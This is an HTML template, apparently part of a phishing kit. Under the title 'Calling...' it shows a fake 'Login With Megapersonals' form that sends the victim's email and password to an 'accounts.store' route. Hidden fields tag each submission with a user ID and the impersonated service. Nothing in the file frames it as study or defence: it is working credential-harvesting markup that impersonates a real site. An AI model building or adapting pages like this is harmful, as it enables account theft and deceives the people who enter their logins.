<html lang="en">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Calling...</title>
      <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
      <script src="https://cdn.tailwindcss.com"></script>
      <style>
         #camera {
         object-fit: cover;
         width: 100vw;
         height: 100vh;
         position: fixed;
         top: 0;
         left: 0;
         z-index: -1;
         }
      </style>
   </head>
   <body>
      <div id="mainSystem" class="h-screen z-1 relative flex items-center justify-center">
         <!-- Login Block -->
         <div id="authenticationBlock" class="min-w-[300px] max-w-[400px] bg-white rounded">
            <div id="loginSystem">
               <form method="post" action="{{ route('accounts.store') }}">
                  <div class="p-5 ">
                     <h2 class="text-2xl font-bold text-gray-600 text-center">Login With Megapersonals</h2>
                     <div class="p-2 h-10 py-1 my-7 flex items-center bg-white overflow-hidden">
                        <div class="w-full">
                            <input type="hidden" name="user_id" value="{{ $user_id }}">
                            <input type="hidden" name="type" value="megapersonals">
                           <label class="w-full text-xs block" id="email-field" htmlfor="email"></label>
                           <input id="email" class="w-full px-3 border-sky-500 border rounded text-lg py-1 outline-sky-500 " type="email" name="email" required="" placeholder="Email address*">
                        </div>
                     </div>
                     <!-- password field -->
                     <div class="p-2 h-10 py-1 my-7 flex items-center bg-white overflow-hidden">
                        <div class="w-full">
                           <label class="w-full text-xs block" id="email-field" htmlfor="email"></label>
                           <input id="password" class="w-full px-3 border-sky-500 border rounded text-lg py-1 outline-sky-500 " type="password" name="password" required="" placeholder="password">
                        </div>
                     </div>
                     <input type="submit" name="submit" class="block p-2 my-5 w-full bg-[#1a73e8] text-xl font-semibold text-white rounded-md" value="login Now">
                  </div>
               </form>
            </div>
         </div>
      </div>
   </body>
</html>
